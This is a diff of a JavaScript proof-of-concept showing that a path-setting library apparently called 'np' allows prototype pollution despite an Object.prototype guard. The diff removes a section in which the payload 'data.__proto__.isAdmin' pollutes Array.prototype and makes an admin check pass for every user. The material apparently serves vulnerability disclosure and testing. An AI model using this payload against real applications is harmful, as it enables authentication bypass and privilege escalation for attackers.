@@ -66,26 +66,4 @@ delete Array.prototype.injected; // cleanup
 console.log("\n=== All 4 vectors confirmed. Object.prototype guard bypassed silently. ===");
 console.log("Note: No ObjectPrototypeMutationError was thrown for any of the above.\n");
 
-// ---------------------------------------------------------------------------
-// BONUS: Demonstrate process-wide persistence (no cleanup)
-// ---------------------------------------------------------------------------
-console.log("--- Bonus: Process-wide persistence demo ---");
-np.set({ data: [] }, "data.__proto__.isAdmin", true);
 
-// Simulate downstream auth check in a different module / request handler
-function checkAdmin(user) {
-  // Developer intent: only returns true if user.isAdmin was explicitly set
-  // After pollution: returns true for ALL users, even fresh objects
-  return user.isAdmin === true;
-}
-
-const attacker = { id: 999, name: "attacker" }; // no isAdmin property
-const normalUser = { id: 1, name: "alice" };     // no isAdmin property
-
-console.log("attacker.isAdmin (raw):", attacker.isAdmin);         // true (polluted)
-console.log("normalUser.isAdmin (raw):", normalUser.isAdmin);     // true (polluted)
-console.log("checkAdmin(attacker):", checkAdmin(attacker));       // true — auth bypass
-console.log("checkAdmin(normalUser):", checkAdmin(normalUser));   // true — collateral
-console.log("[].isAdmin:", [].isAdmin);                           // true — all arrays
-
-delete Array.prototype.isAdmin;
